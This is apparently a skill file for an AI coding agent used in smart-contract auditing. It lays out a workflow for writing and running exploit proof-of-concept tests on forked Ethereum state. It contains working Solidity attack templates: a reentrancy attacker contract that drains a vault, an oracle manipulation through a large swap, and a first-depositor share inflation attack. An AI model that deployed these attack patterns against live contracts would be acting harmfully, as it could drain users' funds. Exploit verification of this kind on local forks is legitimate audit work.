---
name: solidity-guard:verify-exploit
description: Generate and run exploit PoC tests on forked mainnet to verify findings
argument-hint: "[findings.json] [contracts-path]"
allowed-tools:
  - Read
  - Grep
  - Glob
  - Bash
  - Write
  - Task
---

# Dynamic Exploit Verification

Generate and run exploit PoC tests against forked mainnet state to verify findings with concrete proof.

## Quick Start
```bash
/solidity-guard:verify-exploit ./results.json ./contracts
```

## Workflow

### Phase 1: Parse Findings
Read scanner output and prioritize:
- CRITICAL findings: All verified
- HIGH findings: Top 5 verified
- MEDIUM findings: Top 3 if time permits

### Phase 2: Select Verification Environment

| Vulnerability Type | Best Tool | Why |
|---|---|---|
| ETH-001 (Reentrancy) | Foundry fork test | Deploy attacker contract, test callback |
| ETH-006 (Access Control) | Foundry test | Test unauthorized call |
| ETH-019 (Delegatecall) | Foundry fork test | Test with malicious impl |
| ETH-024 (Oracle Manipulation) | Foundry fork test | Need real oracle state |
| ETH-025 (Flash Loan) | Foundry fork test | Need real pool state |
| ETH-030 (Storage Collision) | Foundry test | Compare storage layouts |
| ETH-039 (Signature Replay) | Foundry test | Test replayed signatures |
| ETH-057 (Vault Inflation) | Foundry test | Test first depositor attack |

### Phase 3: Generate Exploit Test

#### ETH-001: Reentrancy PoC
```solidity
// test/exploits/ReentrancyExploit.t.sol
contract ReentrancyExploit is Test {
    Vault target;
    Attacker attacker;

    function setUp() public {
        target = new Vault();
        attacker = new Attacker(address(target));
        deal(address(target), 10 ether);
        deal(address(attacker), 1 ether);
    }

    function testExploit_Reentrancy() public {
        uint256 vaultBefore = address(target).balance;
        attacker.attack{value: 1 ether}();
        uint256 vaultAfter = address(target).balance;

        assertEq(vaultAfter, 0, "Vault should be drained");
        console.log("VERIFIED: Reentrancy exploit drained", vaultBefore, "wei");
    }
}

contract Attacker {
    Vault target;
    constructor(address _target) { target = Vault(_target); }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}
```

#### ETH-024: Oracle Manipulation PoC (Fork Test)
```solidity
contract OracleExploit is Test {
    function testExploit_OracleManipulation() public {
        vm.createSelectFork(ETH_RPC_URL, blockNumber);

        // Snapshot state before
        uint256 vaultBefore = IERC20(token).balanceOf(address(vault));

        // Manipulate oracle (flash loan simulation)
        vm.prank(whaleAddress);
        pool.swap(largeAmount, 0, address(this), "");

        // Execute exploit with manipulated price
        vault.borrow(exploitAmount);

        uint256 vaultAfter = IERC20(token).balanceOf(address(vault));
        console.log("VERIFIED: Oracle manipulation drained", vaultBefore - vaultAfter);
    }
}
```

#### ETH-057: Vault Share Inflation PoC
```solidity
contract VaultInflationExploit is Test {
    function testExploit_FirstDepositorInflation() public {
        // Attacker is first depositor
        vm.startPrank(attacker);
        vault.deposit(1);  // Deposit 1 wei to get 1 share

        // Donate large amount directly to vault
        token.transfer(address(vault), 1000e18);

        // Now victim deposits
        vm.startPrank(victim);
        token.approve(address(vault), 1000e18);
        vault.deposit(1000e18);

        // Victim gets 0 shares due to rounding
        assertEq(vault.balanceOf(victim), 0, "VERIFIED: Victim got 0 shares");
        console.log("VERIFIED: First depositor inflation attack succeeded");
    }
}
```

### Phase 4: Run Tests
```bash
# Run all exploit tests
forge test --match-path "test/exploits/" -vvvv

# Fork test
forge test --match-test "testExploit" --fork-url $ETH_RPC_URL -vvvv
```

### Phase 5: Report Results
For each verified finding:
- **Status**: VERIFIED / DISPROVED / PARTIAL
- **Exploit TX**: Transaction that demonstrates the vulnerability
- **Fund Impact**: Exact tokens/ETH at risk
- **Before/After State**: Balance diffs
- **Reproduction Steps**: Exact commands

## State Diff Report

```
============================================================
ACCOUNT STATE DIFF REPORT — ETH-001 Verification
============================================================

Contract: Vault (0x1234...abcd)
  ETH balance: 10.0 ETH -> 0.0 ETH (-10.0 ETH)

Attacker: 0xdead...beef
  ETH balance: 1.0 ETH -> 11.0 ETH (+10.0 ETH)

Total ETH movement: 10.0 ETH
Status: VERIFIED — Full vault drain via reentrancy
============================================================
```
